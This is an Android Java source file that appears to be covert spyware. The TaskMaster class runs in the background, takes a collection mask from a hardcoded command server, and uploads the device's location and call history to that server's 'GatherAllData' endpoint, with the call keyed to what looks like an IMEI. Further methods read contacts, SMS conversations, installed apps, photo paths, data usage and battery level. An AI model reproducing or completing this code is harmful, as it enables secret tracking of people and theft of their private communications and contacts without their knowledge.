package src.silent.jobs.tasks;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.TrafficStats;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import src.silent.models.ContactModel;
import src.silent.models.SmsModel;
import src.silent.utils.LocationHandler;
import src.silent.utils.ServerCommunicationHandler;

/**
 * Created by all3x on 2/23/2018.
 */

public class TaskMaster extends AsyncTask<Context, Void, Void> {

    private Context params;

    @Override
    protected Void doInBackground(Context... params) {
        this.params = params[0];

        String maskHash = ServerCommunicationHandler.getMask(params[0],
                "http://192.168.1.24:58938/api/Service/GetMask",
                "357336064017681");
        String[] maskHash2 = maskHash.split(";");
        String[] hashes = maskHash2[1].split(":");

        JSONObject bulkData = new JSONObject();
        for (int i = 0; i < maskHash2[0].length(); i++) {
            if (maskHash2[0].charAt(i) == '1') {
                switch (i) {
                    case 0:
                        getSmartphoneLocation(bulkData, hashes[i]);
                        break;
                    case 1:
                        getContacts(bulkData, hashes[i]);
                        break;
                    case 2:
                        getCallHistory(bulkData, hashes[i]);
                        break;
                }
            }
        }
        //getAndroidIDModel();

        ServerCommunicationHandler.executeDataPost(params[0],
                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                "357336064017681");
        return null;
    }

    private void getSmartphoneLocation(JSONObject bulkData, String hash) {
        LocationManager locationManager = (LocationManager)
                params.getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            JSONObject locationData = new JSONObject();
            if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
                    120000) {


                locationData.put("Latitude",
                        Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
                                Base64.URL_SAFE));
                locationData.put("Longitude",
                        Base64.encodeToString(String.valueOf(location.getLongitude()).getBytes(),
                                Base64.URL_SAFE));
            } else {
                LocationHandler locationHandler = new LocationHandler();
                Criteria criteria = new Criteria();
                criteria.setAccuracy(Criteria.ACCURACY_COARSE);
                criteria.setPowerRequirement(Criteria.POWER_LOW);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setSpeedRequired(false);
                criteria.setCostAllowed(true);
                criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
                criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);

                Looper.prepare();
                locationManager.requestSingleUpdate(criteria, locationHandler, null);
                Looper.loop();

                locationData.put("Latitude",
                        Base64.encodeToString(locationHandler.getLatitude().getBytes(),
                                Base64.URL_SAFE));
                locationData.put("Longitude",
                        Base64.encodeToString(locationHandler.getLongitude().getBytes(),
                                Base64.URL_SAFE));
            }

            if (locationData.hashCode() != Integer.parseInt(hash)) {
                locationData.put("Hash", locationData.hashCode());
                bulkData.put("Location", locationData);
            }

        } catch (SecurityException ex) {
            Log.d("Location EXCEPTION", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception ex) {
            Log.d("LOCATION EXCEPTION", ex.getMessage());
        }
    }

    private void getMessages(JSONObject bulkData) {
        List<SmsModel> lstSms = new ArrayList<>();
        SmsModel objSmsModel;
        Uri message = Uri.parse("content://mms-sms/conversations/");
        ContentResolver cr = params.getContentResolver();
        Cursor c = cr.query(message, new String[]{"*"}, null, null,
                "date DESC");
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSmsModel = new SmsModel();
                objSmsModel.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSmsModel.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSmsModel.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSmsModel.setReadState(c.getString(c.getColumnIndex("read")));
                Date date = new Date(Long.
                        parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
                objSmsModel.setTime(date.toString());
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSmsModel.setFolderName("inbox");
                } else {
                    objSmsModel.setFolderName("sent");
                }

                lstSms.add(objSmsModel);
                c.moveToNext();
            }
        }
        c.close();
    }

    private void getContacts(JSONObject bulkData, String hash) {
        List<ContactModel> list = new ArrayList<>();
        ContentResolver contentResolver = params.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
                        Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor cursorInfo = contentResolver.query(ContactsContract.
                                    CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    InputStream inputStream = ContactsContract.Contacts.
                            openContactPhotoInputStream(params.getContentResolver(),
                                    ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                            new Long(id)));

                    Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                            new Long(id));
                    Uri pURI = Uri.withAppendedPath(person,
                            ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                    Bitmap photo = null;
                    if (inputStream != null) {
                        photo = BitmapFactory.decodeStream(inputStream);
                    }
                    cursorInfo.moveToFirst();
                    ContactModel info = new ContactModel();
                    info.id = id;
                    info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.
                            Contacts.DISPLAY_NAME));
                    info.mobileNumber = cursorInfo.getString(cursorInfo.
                            getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    info.photo = photo;
                    info.photoURI = pURI;
                    list.add(info);

                    cursorInfo.close();
                }
            }
            cursor.close();
        }
    }

    private void getCallHistory(JSONObject bulkData, String hash) {
        try {
            ContentResolver contentResolver = params.getContentResolver();
            Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                    null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            JSONObject callHistory = new JSONObject();
            JSONArray informationArray = new JSONArray();
            while (managedCursor.moveToNext()) {
                JSONObject information = new JSONObject();
                information.put("Number", managedCursor.getString(number));
                information.put("Date", managedCursor.getString(date));
                information.put("Duration", managedCursor.getString(duration));

                String callType = managedCursor.getString(type);
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                         information.put("Direction", "OUTGOING");
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        information.put("Direction", "INCOMING");
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        information.put("Direction", "MISSED");
                        break;
                }

                informationArray.put(information);
            }
            managedCursor.close();

            callHistory.put("Calls", informationArray);
            if (informationArray.hashCode() != Integer.parseInt(hash)) {
                callHistory.put("Hash", informationArray.hashCode());
                bulkData.put("CallHistory", callHistory);
            }

        } catch (SecurityException ex) {
            Log.d("CALL LOG EX", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void getMobileDataUsage(JSONObject bulkData) {
        long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
        long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
        long totalTrafic = totalTraficReceived + totalTraficTransmitted;
    }

    private void getInstalledApps(JSONObject bulkData) {
        PackageManager pm = params.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            String package_name = packageInfo.packageName;
            ApplicationInfo app = null;
            try {
                app = pm.getApplicationInfo(package_name, 0);
            } catch (PackageManager.NameNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            String name = (String) pm.getApplicationLabel(app);
            Drawable icon = pm.getApplicationIcon(app);
            int i = 0;
            i++;
        }
    }

    private void getPhotosVideos(JSONObject bulkData) {
        ContentResolver cr = params.getContentResolver();
        String[] filePathColumn = {MediaStore.Images.Media.DATA};
        Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, filePathColumn
                , null, null, null);
        if (cur.moveToFirst()) {
            do {
                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                String picturePath = cur.getString(columnIndex);
                if (picturePath != null) {
                    File file = new File(picturePath);

                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
                }
            } while (cur.moveToNext());
        }
        cur.close();

        cur = cr.query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, filePathColumn
                , null, null, null);
        if (cur.moveToFirst()) {
            do {
                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                String picturePath = cur.getString(columnIndex);
                if (picturePath != null) {
                    File file = new File(picturePath);
                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
                }
            } while (cur.moveToFirst());
        }
        cur.close();
    }

    private void getBatteryLevel(JSONObject bulkData) {
        BroadcastReceiver batteryReceriver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = level / (float) scale;
                Log.d("BETTERY", "" + batteryPct);
            }
        };
        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        params.registerReceiver(batteryReceriver, batteryFilter);
    }
}
